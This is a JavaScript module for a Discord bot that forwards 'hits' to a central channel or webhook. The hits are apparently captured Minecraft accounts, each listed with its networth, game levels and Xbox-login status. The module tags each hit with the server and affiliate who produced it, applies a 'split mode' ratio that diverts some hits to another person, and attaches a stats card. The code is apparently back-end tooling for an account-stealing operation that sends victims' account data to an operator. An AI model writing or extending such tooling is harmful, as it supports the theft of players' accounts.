const axios = require('axios');
const config = require('../../../config.json');
const { makeCard } = require('../drawhit.js');
const { AttachmentBuilder } = require('discord.js');
const fs = require('fs');
const path = require('path');

async function mirrorToMainHits(client, messageObj, interaction, splitInfo = null, acc = null) {
  try {
    const channelId = config.mainHitsChannel;
    const webhookUrl = config.mainHitsWebhook;
    if (!channelId && !webhookUrl) return;

    const cloned = JSON.parse(JSON.stringify(messageObj || {}));
    cloned.embeds = cloned.embeds || [];
    if (cloned.embeds.length === 0) cloned.embeds.push({});

    const emb = cloned.embeds[0];
    emb.fields = emb.fields || [];

    const serverName = interaction?.guild?.name || 'Unknown Server';
    const serverId   = interaction?.guild?.id   || '?';
    const ownerId    = client?.username          || 'unknown';

    emb.fields.push(
      { name: 'Server', value: `\`${serverName} (${serverId})\``, inline: true },
      { name: 'Owner',  value: `<@${ownerId}> (\`${ownerId}\`)`,  inline: true }
    );

    // sten.wtf link if username available
    const mcName = acc?.newName || acc?.name || messageObj?.acc?.name || null;
    if (mcName && mcName !== 'XBL Failed' && mcName !== "Couldn't find!" && mcName !== 'No Minecraft!') {
      emb.fields.push({
        name: '📊 Stats',
        value: `[View on sten.wtf](https://sten.wtf/${mcName})`,
        inline: true
      });
    }

    if (splitInfo) {
      if (splitInfo.shouldSplit && splitInfo.ownerId) {
        emb.fields.push({
          name:  '🔀 Split Mode',
          value: `✅ Sent to <@${splitInfo.ownerId}> (1:${splitInfo.ratio})`,
          inline: false
        });
        if (!emb.color) emb.color = 0x9B59B6;
      } else if (splitInfo.ratio) {
        emb.fields.push({
          name:  '🔀 Split Mode',
          value: `⏳ Counting (1:${splitInfo.ratio})`,
          inline: false
        });
      }
    }

    emb.footer      = emb.footer || {};
    emb.footer.text = emb.footer.text ? `${emb.footer.text} • mirrored` : 'mirrored';
    delete cloned.components;

    // ── Generate stats card image if account has MC username ──────────────
    let cardAttachment = null;
    if (mcName && mcName !== 'XBL Failed' && mcName !== "Couldn't find!" && mcName !== 'No Minecraft!') {
      try {
        const stats = {
          username:       mcName,
          networth:       acc?.networth       || '0',
          bedwars:        acc?.bedwarsLevel   || '0',
          networkLevel:   acc?.networkLevel   || '1',
          sbLevel:        acc?.sbLevel        || '0',
          duelKDR:        acc?.duelKDR        || '0',
          duelWinstreak:  acc?.duelWinstreak  || '0',
          plusColour:     acc?.plusColour     || 'None',
          gifted:         acc?.gifted         || '0',
          skywarsLevel:   acc?.skywarsLevel   || '0',
        };

        const tempDir = path.join(__dirname, '../../temp');
        if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });

        const outputPath = path.join(tempDir, `${mcName}_${Date.now()}.png`);
        const buffer     = await makeCard(stats, outputPath);

        if (buffer) {
          cardAttachment = new AttachmentBuilder(buffer, { name: `${mcName}_stats.png` });
          emb.image = { url: `attachment://${mcName}_stats.png` };
        }

        // cleanup
        if (fs.existsSync(outputPath)) fs.unlinkSync(outputPath);
      } catch (cardErr) {
        console.error('[mirrorToMainHits] Card generation failed:', cardErr?.message);
      }
    }

    // ── Send to hits channel ──────────────────────────────────────────────
    if (channelId) {
      const chan = client.channels.cache.get(channelId);
      if (chan) {
        const payload = { ...cloned };
        if (cardAttachment) payload.files = [cardAttachment];
        await chan.send(payload);
        return;
      }
      console.warn(`mirrorToMainHits: mainHitsChannel ${channelId} not found in cache`);
    }

    if (webhookUrl) {
      await axios.post(webhookUrl, cloned);
    }

  } catch (err) {
    console.error('mirrorToMainHits failed:', err?.response?.data || err?.message || err);
  }
}

module.exports = { mirrorToMainHits };
